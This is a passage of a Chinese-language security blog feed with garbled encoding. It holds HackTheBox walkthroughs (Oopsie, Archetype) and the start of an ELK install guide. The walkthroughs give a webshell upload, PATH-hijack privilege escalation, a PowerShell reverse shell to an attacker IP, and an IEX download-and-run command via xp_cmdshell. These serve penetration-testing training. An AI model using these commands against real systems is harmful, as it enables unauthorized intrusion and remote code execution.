    <content type="html"><![CDATA[<h1 id="Hackbox-Oopsie"><a href="#Hackbox-Oopsie" class="headerlink" title="Hackbox -Oopsie"></a>Hackbox -Oopsie</h1><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -T4 10.10.10.28</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211054709.png" alt="image-20200524211054709"></p><p>è§‚å¯Ÿå‘ç°ï¼Œç›®æ ‡å¼€æ”¾äº†22ã€80ç«¯å£</p><p>è®¿é—®ç›®æ ‡80ç«¯å£ï¼Œä¸çŸ¥é“ä»€ä¹ˆä¸€ä¸ªç¨€å¥‡å¤æ€ªçš„ç½‘ç«™</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211334431.png" alt="image-20200524211334431"></p><p>Webé¡µé¢çš„è¯ï¼Œå½“ç„¶æ˜¯å¯åŠ¨burpç¥å™¨</p><p>burpè§‚å¯Ÿçˆ¬å–åˆ°ä¸€äº›url</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211705547.png" alt="image-20200524211705547"></p><p>è§‚å¯Ÿå‘ç°ä¼¼ä¹æœ‰ä¸ªç™»å½•é¡µé¢ï¼Œè®¿é—®çœ‹çœ‹</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524211923514.png" alt="image-20200524211923514"></p><h2 id="å°è¯•æ”»å‡»"><a href="#å°è¯•æ”»å‡»" class="headerlink" title="å°è¯•æ”»å‡»"></a>å°è¯•æ”»å‡»</h2><p>ç»§ä¸Šè¿°ç™»å½•é¡µé¢ï¼ŒæŒ‰è€ç¾çš„æ€è·¯å’Œå¸¸è§è¿™ç§é¶æœºçš„æ‰“æ³•æ€è·¯æ¥çœ‹ï¼Œè¿™ç§ç™»å½•æ¥å£çš„å¯†ç ææœ‰å¯èƒ½å’Œç›®æ ‡ç½‘ç«™çš„ä¸€äº›å…³é”®è¯æœ‰å…³ã€‚</p><p>åˆ©ç”¨burpçˆ†ç ´å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·adminå’Œadministrator,å¯†ç éƒ½æ˜¯MEGACORP_4dm1n!!</p><p>ç™»å½•ä¸€ä¸‹æŸ¥çœ‹</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524212854146.png" alt="image-20200524212854146"></p><p>æœ‰ä¸ªä¸Šä¼ é¡µé¢ï¼Œä½†ä¼¼ä¹æƒé™ä¸è¶³ï¼Œæ ¹æ®æç¤ºè¿˜æœ‰ä¸ªè¶…çº§ç®¡ç†å‘˜è´¦å·</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213028810.png" alt="image-20200524213028810"></p><p>åˆ·æ–°accountsé¡µé¢ï¼ŒæŠ“åŒ…å‘ç°æœ‰ä¸ªè¯¡å¼‚ç‚¹</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213145555.png" alt="image-20200524213145555"></p><p>æŒ–SRCå¤§ä½¬è‚¯å®šå·²ç»å‘ç°ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨è¶Šæƒæˆ–è€…ç”¨æˆ·éå†ï¼Œè¯•è¯•çˆ†ç ´</p><p>è®¾ç½®IDä¸ºçˆ†ç ´å­—æ®µï¼ŒPayloadå†™ä¸ª1åˆ°100å§ï¼Œåº”è¯¥ä¸ä¼šå¤ªå¤§IDå§ï¼Œä¸ç„¶æˆ‘å°±è¦éª‚äººäº†</p><p>é‡å®šå‘é€‰æ‹©æ€»æ˜¯è·Ÿéš</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213438069.png" alt="image-20200524213438069"></p><p>çˆ†ç ´å¾—åˆ°IDå€¼30ä¸ºè¶…çº§ç®¡ç†è´¦æˆ·ï¼Œuserå­—æ®µä¸º86575ï¼Œæ›¿æ¢è¯·æ±‚åŒ…ï¼Œå¾—åˆ°è¶…çº§ç®¡ç†å‘˜æƒé™</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524213754027.png" alt="image-20200524213754027"></p><p>å†æ¬¡è®¿é—®ä¸Šä¼ é¡µé¢</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524214154423.png" alt="image-20200524214154423"></p><p>ä¸Šä¼ phpé©¬</p><p>åˆ©ç”¨å·¥å…·<code>weevely</code>ç”Ÿæˆphp webshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524214508418.png" alt="image-20200524214508418"></p><p>Repeaterä¸€ä¸‹ï¼Œä¸Šä¼ æˆåŠŸä½†ä¼¼ä¹æ²¡æœ‰è¿”å›è·¯å¾„</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524214845512.png" alt="image-20200524214845512"></p><blockquote><p>PS:è¿™é‡Œæ³¨æ„ä¸Šä¼ æ—¶åŒæ ·è¦æ›¿æ¢userå­—æ®µï¼Œè¿™é‡Œæ²¡æ³¨æ„ï¼Œå›¾æˆªé”™äº†ï¼Œå°†å°±ç€çœ‹</p></blockquote><p>åˆ©ç”¨æ‰«ç›®å½•å·¥å…·å¯ä»¥æ‰«åˆ°ä¸€ä¸ªuploadsç›®å½•</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524215045193.png" alt="image-20200524215045193"></p><p>weevelyè¿æ¥webshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524215631386.png" alt="image-20200524215631386"></p><p>å¥½åƒæƒé™ä¸é«˜</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524220355679.png" alt="image-20200524220355679"></p><h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><p>ç¿»åƒåœ¾ing</p><p>ç¿»åˆ°ä¸€ä¸ªæ•°æ®åº“è¿æ¥å¯†ç robert/M3g4C0rpUs3r!</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524220503313.png" alt="image-20200524220503313"></p><p>ç”±äºè¿™é‡Œéœ€è¦suç”¨æˆ·,éœ€è¦ä¸€ä¸ªç»ˆç«¯</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524223227565.png" alt="image-20200524223227565"></p><p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤,å¼¹å›äº¤äº’å¼ç»ˆç«¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">Ctrl-Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224006134.png" alt="image-20200524224006134"></p><p>åˆ‡æ¢æˆåŠŸï¼ŒidæŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ï¼Œæ˜¾ç¤º<strong>robert</strong>æ˜¯<strong>Bugracker</strong>ç»„çš„æˆå‘˜</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224304929.png" alt="image-20200524224304929"></p><h2 id="æå‡æƒé™"><a href="#æå‡æƒé™" class="headerlink" title="æå‡æƒé™"></a>æå‡æƒé™</h2><p>ç¿»åƒåœ¾â€¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -group bugtracker 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224527753.png" alt="image-20200524224527753"></p><p>æŸ¥çœ‹è¯¥æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -la /usr/bin/bugtracker</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¯¥æ–‡ä»¶çœ‹çœ‹ï¼Œä¼¼ä¹éœ€è¦æä¾›idå€¼ï¼Œéšä¾¿å¡«äº†ä¸ª</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524224942679.png" alt="image-20200524224942679"></p><p>å¥½åƒæ˜¯åŸºäºIDå€¼è¾“å‡ºæŠ¥å‘Šï¼Œåˆ©ç”¨<code>strings</code>å‘½ä»¤çœ‹çœ‹æ˜¯å¦‚ä½•å·¥ä½œçš„</p><blockquote><p>Stringså‘½ä»¤ç›¸å…³ç”¨æ³•å‚è€ƒï¼š<a href="https://blog.csdn.net/stpeace/article/details/46641069">https://blog.csdn.net/stpeace/article/details/46641069</a></p></blockquote><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524225243714.png" alt="image-20200524225243714"></p><p>è§‚å¯Ÿå‘ç°catå‘½ä»¤ä½¿ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„è€Œä¸æ˜¯ç»å¯¹è·¯å¾„</p><blockquote><p>ææƒæ€è·¯ï¼šåˆ›å»ºæ¶æ„ç¨‹åº<code>cat</code>ï¼Œå¹¶ä¿®æ”¹è·¯å¾„ä»¥åŒ…æ‹¬å½“å‰å·¥ä½œç›®å½•ï¼Œåˆ©ç”¨è¿™ç§é”™è¯¯é…ç½®ï¼Œææƒä¸ºroot</p></blockquote><p>å½“å‰å·¥ä½œç›®å½•æ·»åŠ åˆ°PATHï¼Œåˆ›å»ºcat äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œèµ‹äºˆæ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /tmp/</span><br><span class="line">echo &#x27;/bin/sh&#x27; &gt; cat</span><br><span class="line">chmod +x cat</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524225754710.png" alt="image-20200524225754710"></p><p>å†æ¬¡æ‰§è¡Œåˆšåˆšçš„è„šæœ¬æ–‡ä»¶ï¼Œæå‡æƒé™ä¸ºroot</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230014964.png" alt="image-20200524230014964"></p><p>ç¿»åƒåœ¾â€¦ç¿»åˆ°ftpç”¨æˆ·ï¼šftpuser/mc@F1l3ZilL4</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230457656.png" alt="image-20200524230457656"></p><blockquote><p>è¿™é‡Œæ³¨æ„ä¸è¦ç”¨catæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå› ä¸ºcatå‘½ä»¤å·²è¢«æˆ‘ä»¬æ”¹äº†ï¼Œå¯ä»¥ä½¿ç”¨moreç­‰å…¶ä»–å‘½ä»¤æŸ¥çœ‹</p></blockquote><p>ç»§ç»­ç¿»åˆ°root</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230645348.png" alt="image-20200524230645348"></p><p>ç»§ç»­ç¿»åˆ°user.txt</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200524230838795.png" alt="image-20200524230838795"></p><h2 id="æ¸¸æˆæŠ€æœ¯"><a href="#æ¸¸æˆæŠ€æœ¯" class="headerlink" title="æ¸¸æˆæŠ€æœ¯"></a>æ¸¸æˆæŠ€æœ¯</h2><p>åˆ°æ­¤æ¸¸æˆç»“æŸï¼Œè·å¾—å¤–å·åƒåœ¾ç‹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hackbox-Oopsie&quot;&gt;&lt;a href=&quot;#Hackbox-Oopsie&quot; class=&quot;headerlink&quot; title=&quot;Hackbox -Oopsie&quot;&gt;&lt;/a&gt;Hackbox -Oopsie&lt;/h1&gt;&lt;h2 id=&quot;ä¿¡æ¯æœé›†&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="é¶æœºå¤ç°" scheme="http://example.com/categories/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>Hackboxåˆæ¢</title>
    <link href="http://example.com/2020/05/18/Hackbox-%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2020/05/18/Hackbox-%E5%88%9D%E6%8E%A2/</id>
    <published>2020-05-18T15:36:58.000Z</published>
    <updated>2021-09-28T09:28:18.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hackboxåˆæ¢"><a href="#Hackboxåˆæ¢" class="headerlink" title="Hackboxåˆæ¢"></a>Hackboxåˆæ¢</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><blockquote><p>hacktheboxæ˜¯ä¸€ä¸ªéå¸¸ä¸é”™çš„åœ¨çº¿å®éªŒå¹³å°ï¼Œèƒ½å¸®åŠ©ä½ æå‡æ¸—é€æµ‹è¯•æŠ€èƒ½å’Œé»‘ç›’æµ‹è¯•æŠ€èƒ½ï¼Œå¹³å°ä¸Šæœ‰å¾ˆå¤šé¶æœºï¼Œä»æ˜“åˆ°éš¾ï¼Œå„ä¸ªçº§åˆ«çš„é¶æœºéƒ½æœ‰ã€‚</p></blockquote><p>å…³äºhackboxæ³¨å†Œè´¦å·ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œè¯¦æƒ…å‚è€ƒç™¾åº¦</p><h2 id="ä¿¡æ¯æ¢æµ‹"><a href="#ä¿¡æ¯æ¢æµ‹" class="headerlink" title="ä¿¡æ¯æ¢æµ‹"></a>ä¿¡æ¯æ¢æµ‹</h2><p>Nmapæ‰«æç›®æ ‡ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -T4 10.10.10.27</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518202226161.png" alt="image-20200518202226161"></p><p>è§‚å¯Ÿå‘ç°ï¼Œç›®å‰å¼€å¯äº†1433ã€445ï¼Œå¼€å¯äº†SQLserverå’Œsmbå…±äº«æœåŠ¡</p><blockquote><p>æ€è·¯ï¼šç›®æ ‡å¼€å¯äº†smbæœåŠ¡ï¼Œå°è¯•æ˜¯å¦å¯åŒ¿åè®¿é—®</p></blockquote><p>åˆ©ç”¨smbclientå·¥å…·è¿›è¡Œå°è¯•è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L \\\\10.10.10.27\\</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518202957752.png" alt="image-20200518202957752"></p><p>è§‚å¯Ÿå‘ç°æœ‰ä¸ªbackupï¼Œå¾ˆå¯ç–‘ï¼Œåˆ©ç”¨å·¥å…·smbclientçœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient  -N \\\\10.10.10.27\\backups</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518203517978.png" alt="image-20200518203517978"></p><p>æœ‰ä¸€ä¸ªdtsConfigæ–‡ä»¶ï¼Œå®ƒæ˜¯ä¸SSISä¸€èµ·ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ã€‚</p><p>ç›¸å…³SSISä»‹ç»å¯å‚è€ƒä¸‹é¢é“¾æ¥</p><blockquote><p><a href="https://baike.baidu.com/item/SSIS/5351898?fr=aladdin">https://baike.baidu.com/item/SSIS/5351898?fr=aladdin</a></p></blockquote><p>ä¸‹è½½dtsConfigæ–‡ä»¶</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518204446382.png" alt="image-20200518204446382"></p><p>è§‚å¯Ÿæœ‰ä¸ªsqlé“¾æ¥ï¼Œè¿˜æœ‰ä¸ªæœ¬åœ°windowsç”¨æˆ·å‡­æ®ARCHETYPE\sql_svc</p><h2 id="æ·±å…¥åˆ©ç”¨"><a href="#æ·±å…¥åˆ©ç”¨" class="headerlink" title="æ·±å…¥åˆ©ç”¨"></a>æ·±å…¥åˆ©ç”¨</h2><p>ä½¿ç”¨<a href="https://github.com/SecureAuthCorp/impacket">Impacketå·¥å…·åŒ…</a> ä¸­mssqlclient.py ç»“åˆä¸Šä¸€æ­¥å¾—åˆ°çš„å‡­æ®è¿æ¥åˆ°SQL Server ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518224208800.png" alt="image-20200518224208800"></p><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯æœ€é«˜æƒé™</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518224814948.png" alt="image-20200518224814948"></p><p>Niceï¼sysadminæƒé™</p><p>å¼€å¯xp_cmdshell</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--æ‰“å¼€xp_cmdshell</span></span><br><span class="line"> <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br><span class="line"><span class="comment">--å…³é—­xp_cmdshell</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>å°è¯•æ‰§è¡Œå‘½ä»¤</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518225619469.png" alt="image-20200518225619469"></p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>å°è¯•åˆ©ç”¨powershellåå¼¹shellï¼Œæ„é€ Payloadå¦‚ä¸‹,ä¿å­˜ps1</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.14.138&quot;</span>,<span class="number">1234</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨pythonå»ºç«‹httpæœåŠ¡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>å¼€å¯ç»ˆç«¯ç›‘å¬åå¼¹ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨xp_cmdshellè¿œç¨‹åŠ è½½Powershellï¼ŒPayloadå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (<span class="keyword">New</span><span class="operator">-</span>Object Net.WebClient).DownloadString(\&quot;http://10.10.14.138/1.ps1\&quot;);&quot; </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518230436267.png" alt="image-20200518230436267"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518230518649.png" alt="image-20200518230518649"></p><p>ç¿»åƒåœ¾æ‰¾åˆ°user.txt</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518232024516.png" alt="image-20200518232024516"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç”±äºè¯¥è´¦æˆ·æ—¢æ˜¯æœåŠ¡è´¦æˆ·ä¹Ÿæ˜¯æœ¬åœ°æ™®é€šè´¦æˆ·ï¼Œå› æ­¤å¾—æ£€æŸ¥å†å²å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518232227210.png" alt="image-20200518232227210"></p><p>è§‚å¯Ÿå¾—çŸ¥ï¼Œåœ¨åšbackupå…±äº«æ—¶ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜è¿›è¡Œæ˜ å°„</p><p>åˆ©ç”¨Impacketå·¥å…·åŒ…ä¸­çš„psexec.pyææƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec.py administrator@10.10.10.27</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518233119398.png" alt="image-20200518233119398"></p><p>æ¡Œé¢ç¿»åˆ°åƒåœ¾</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200518233353538.png" alt="image-20200518233353538"></p><h2 id="æ¸¸æˆç»“æŸ"><a href="#æ¸¸æˆç»“æŸ" class="headerlink" title="æ¸¸æˆç»“æŸ"></a>æ¸¸æˆç»“æŸ</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hackboxåˆæ¢&quot;&gt;&lt;a href=&quot;#Hackboxåˆæ¢&quot; class=&quot;headerlink&quot; title=&quot;Hackboxåˆæ¢&quot;&gt;&lt;/a&gt;Hackboxåˆæ¢&lt;/h1&gt;&lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="é¶æœºå¤ç°" scheme="http://example.com/categories/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>åŸºäºCentoså¿«é€Ÿæ­å»ºELK</title>
    <link href="http://example.com/2020/05/07/%E5%9F%BA%E4%BA%8ECentos7%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAELK/"/>
    <id>http://example.com/2020/05/07/%E5%9F%BA%E4%BA%8ECentos7%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAELK/</id>
    <published>2020-05-07T15:44:24.000Z</published>
    <updated>2021-09-28T09:37:54.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸºäºCentoså¿«é€Ÿæ­å»ºELK"><a href="#åŸºäºCentoså¿«é€Ÿæ­å»ºELK" class="headerlink" title="åŸºäºCentoså¿«é€Ÿæ­å»ºELK"></a>åŸºäºCentoså¿«é€Ÿæ­å»ºELK</h1><p>[TOC]</p><blockquote><p>ELKæ˜¯ä¸€ä¸ªæˆç†Ÿçš„æ—¥å¿—ç³»ç»Ÿï¼Œä¸»è¦åŠŸèƒ½æœ‰æ”¶é›†ã€åˆ†æã€æ£€ç´¢ï¼Œè¯¦ç»†è§ <a href="https://www.elastic.co/cn/products">elasticå®˜ç½‘</a>ã€‚</p><p>æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•åœ¨CentOS7ä¸‹å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ELKï¼Œå½“ç„¶ç°åœ¨dockerå·²ç»æœ‰å®Œå…¨é…ç½®æˆåŠŸçš„elkå®¹å™¨ï¼Œå®‰è£…é…ç½®éå¸¸æ–¹ä¾¿.</p></blockquote><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ul><li>centos-7-x86_64</li><li>java8</li><li>elasticsearch-7.6.2</li><li>kibana-7.6.2</li><li>logstash-7.6.2</li></ul><h2 id="å®‰è£…è¿‡ç¨‹"><a href="#å®‰è£…è¿‡ç¨‹" class="headerlink" title="å®‰è£…è¿‡ç¨‹"></a>å®‰è£…è¿‡ç¨‹</h2><h3 id="å…³é—­é˜²ç«å¢™å’ŒSelinux"><a href="#å…³é—­é˜²ç«å¢™å’ŒSelinux" class="headerlink" title="å…³é—­é˜²ç«å¢™å’ŒSelinux"></a>å…³é—­é˜²ç«å¢™å’ŒSelinux</h3><p><strong>å…³é—­Selinux</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/selinux</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELINUX=disabled      #éœ€é‡å¯æ°¸ä¹…ç”Ÿæ•ˆ </span><br><span class="line">wq                    #ä¿å­˜é€€å‡º</span><br><span class="line">setenforce 0             #ä¸´æ—¶ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504171123609.png" alt="image-20200504171123609"></p><p><strong>å…³é—­Firewalld</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld         #å…³é—­é˜²ç«å¢™</span><br><span class="line">systemctl disable firewalld    #ç¦æ­¢å¼€æœºè‡ªå¯</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504171423477.png" alt="image-20200504171423477"></p><h3 id="å®‰è£…JDK"><a href="#å®‰è£…JDK" class="headerlink" title="å®‰è£…JDK"></a>å®‰è£…JDK</h3><p>å…ˆæ˜¯ç¡®è®¤ç¯å¢ƒrpm -qa|grep <a href="https://www.linuxidc.com/Java">Java</a><br>å¦‚æœæœ‰å…¶ä»–ç‰ˆæœ¬çš„è¯·åˆ é™¤<br>rpmâ€“e â€“nodeps java-*<br>æ£€æŸ¥æ˜¯å¦åˆ é™¤<br>java â€“version</p><h3 id="å®‰è£…Elasticsearch"><a href="#å®‰è£…Elasticsearch" class="headerlink" title="å®‰è£…Elasticsearch"></a>å®‰è£…Elasticsearch</h3><ol><li>å¯¼å…¥å¯†é’¥</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>ä¸‹è½½æœ€æ–°çš„å®‰è£…åŒ…</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.6.2-x86_64.rpm</span><br></pre></td></tr></table></figure><blockquote><p>ä¸‹è½½è¾ƒæ…¢çš„è¯å»ºè®®ç§‘å­¦ä¸‹è½½</p></blockquote><ol start="3"><li>å®‰è£…</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh elasticsearch-7.6.2-x86_64.rpm </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504174503913.png" alt="image-20200504174503913"></p><ol start="4"><li>é…ç½®</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/elasticsearch/elasticsearch.yml</span><br></pre></td></tr></table></figure><p>å–æ¶ˆä»¥ä¸‹ä¸¤è¡Œçš„æ³¨é‡Š</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504174906489.png" alt="image-20200504174906489"></p><p><img 